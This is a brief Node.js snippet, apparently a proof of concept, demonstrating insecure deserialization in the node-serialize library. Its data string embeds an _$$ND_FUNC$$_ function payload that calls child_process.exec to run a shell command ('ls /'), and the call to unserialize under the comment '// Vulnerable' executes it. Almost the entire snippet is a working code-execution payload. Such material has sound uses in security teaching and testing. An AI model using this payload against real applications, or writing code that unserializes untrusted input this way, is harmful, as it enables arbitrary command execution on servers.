var serialize = require('node-serialize');

var data = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';

// Vulnerable
serialize.unserialize(data);
